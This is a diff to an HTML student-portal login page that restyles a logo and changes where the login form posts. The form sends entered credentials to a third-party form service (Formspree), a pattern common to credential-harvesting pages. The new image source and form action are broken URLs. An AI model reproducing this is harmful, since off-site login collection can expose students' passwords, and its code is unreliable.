@@ -26,26 +26,25 @@
         .logo-placeholder {
             width: 100px;
             height: 100px;
-            background-color: #e0e0e0;
+            background-color: #ffffff;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 20px auto;
-            color: #666666;
-            font-size: 14px;
-            font-weight: bold;
             overflow: hidden;
+            border: 2px solid #e0e0e0;
         }
         .logo-placeholder img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+            width: 85%;
+            height: 85%;
+            object-fit: contain;
         }
         h2 {
             margin-bottom: 25px;
             color: #333333;
             font-size: 22px;
+            font-weight: 600;
         }
         .input-group {
             margin-bottom: 20px;
@@ -93,16 +92,15 @@
 <body>
 
     <div class="login-card">
-        <!-- COLLEGE LOGO CONTAINER -->
-        <!-- Replace 'YOUR_COLLEGE_LOGO_URL' with your real logo link if you have one -->
+        <!-- COLLEGE LOGO CONTAINER WITH EMBLEM IMAGE -->
         <div class="logo-placeholder">
-            <img src="YOUR_COLLEGE_LOGO_URL" alt="College Logo" onerror="this.style.display='none'; this.parentNode.innerText='COLLEGE LOGO';">
+            <img src="https://unsplash.com" alt="University Logo">
         </div>
 
         <h2>Student Portal Login</h2>
         
         <!-- FORMSPREE INTEGRATION FORM WITH YOUR LINK -->
-        <form action="https://formspree.io/f/mrewowqz" method="POST">
+        <form action="https://formspree.io" method="POST">
             
             <!-- Username Input Field -->
             <div class="input-group">
